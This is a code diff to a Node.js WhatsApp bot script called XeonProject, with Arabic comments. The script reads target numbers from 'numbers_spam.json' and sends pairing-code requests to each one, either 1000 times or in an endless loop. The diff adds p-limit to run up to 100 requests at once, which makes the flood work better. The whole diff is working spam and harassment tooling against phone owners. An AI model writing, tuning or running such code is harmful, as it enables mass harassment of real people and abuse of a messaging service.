@@ -3,6 +3,7 @@ const pino = require('pino');
 const readline = require("readline");
 const fs = require('fs');
 const { spawn } = require('child_process');
+const pLimit = require('p-limit'); // استيراد مكتبة p-limit
 
 const question = (text) => {
     const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
@@ -52,6 +53,8 @@ async function XeonProject() {
         new Promise((resolve) => setTimeout(() => resolve('2'), 1000))
     ]);
 
+    const limit = pLimit(100); // تحديد الحد الأقصى للطلبات المتزامنة
+
     const intervalId = setInterval(() => {
         loadNumbers();
         if (checkFileChange('numbers_spam.json')) {
@@ -76,12 +79,16 @@ async function XeonProject() {
         if (option === '1') {
             const xeonCodes = 1000;
             for (let i = 0; i < xeonCodes; i++) {
-                await Promise.all(phoneNumbers.map((phoneNumber) => sendPairingCode(XeonBotInc, phoneNumber, i + 1, xeonCodes)));
+                await Promise.all(phoneNumbers.map((phoneNumber) => 
+                    limit(() => sendPairingCode(XeonBotInc, phoneNumber, i + 1, xeonCodes))
+                ));
             }
         } else {
             let count = 0;
             while (true) {
-                await Promise.all(phoneNumbers.map((phoneNumber) => sendPairingCode(XeonBotInc, phoneNumber, ++count)));
+                await Promise.all(phoneNumbers.map((phoneNumber) => 
+                    limit(() => sendPairingCode(XeonBotInc, phoneNumber, ++count))
+                ));
             }
         }
     } catch (error) {
